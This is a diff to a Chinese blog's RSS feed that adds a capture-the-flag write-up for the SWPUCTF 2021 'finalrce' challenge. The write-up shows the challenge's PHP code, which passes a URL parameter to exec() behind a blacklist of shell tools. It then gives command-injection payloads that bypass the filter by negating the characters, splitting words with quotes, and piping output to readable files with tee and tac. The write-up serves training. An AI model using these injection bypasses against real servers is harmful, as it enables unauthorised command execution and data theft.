@@ -10,9 +10,39 @@
         </author>
         <description>家里蹲，死肥宅</description>
         <language>zh-CN</language>
-        <pubDate>Wed, 03 Jul 2024 22:35:15 +0800</pubDate>
-        <lastBuildDate>Wed, 03 Jul 2024 22:35:15 +0800</lastBuildDate>
+        <pubDate>Wed, 17 Jul 2024 23:12:12 +0800</pubDate>
+        <lastBuildDate>Wed, 17 Jul 2024 23:12:12 +0800</lastBuildDate>
         <category term="数据库" />
+        <item>
+            <guid isPermalink="true">http://example.com/2024/07/17/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-finalrce/</guid>
+            <title>[SWPUCTF 2021 新生赛]finalrce</title>
+            <link>http://example.com/2024/07/17/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-finalrce/</link>
+            <category term="网络安全" scheme="http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" />
+            <category term="SWPUCTF 2021" scheme="http://example.com/tags/SWPUCTF-2021/" />
+            <pubDate>Wed, 17 Jul 2024 23:12:12 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;进入网站页面后显示 php 代码:&lt;/p&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;highlight_file&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;url&amp;#x27;&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$url&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;url&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&amp;quot;|\&amp;gt;|\&amp;lt;|\%|\$/i&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$url&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Sorry,you can&amp;#x27;t use this.&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Can you see anything?&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;exec&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$url&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;可以看到其中 preg_match 过滤了基本的一些命令，想要通过 exec 执行需要绕过去。&lt;br /&gt;
+测试以下命令，发现不能执行：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;?url=ls;sleep 5&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;对 ls 取反，继续执行：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;?url=%93%8C;sleep 5&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;发现可以执行。其中英文字母的 url 编码为 16 进制前添加 %。&lt;br /&gt;
+接下来使用 tee 命令将标准输入中的数据写入输出文件中:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;?url=l&#39;&#39;s /|tee 1.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;访问 http://ip:port/?1.txt 可以看到根目录下的所有文件夹。&lt;br /&gt;
+由于 cat 被过滤了，使用 tac 反向显示文件内容：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;?url=tac /file|tee 2.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://example.com/2024/07/03/ZJCTF-2019-NiZhuanSiWei-KiHanahare%E7%9A%84WriteUp/</guid>
             <title>[ZJCTF 2019]NiZhuanSiWei KiHanahare的WriteUp</title>
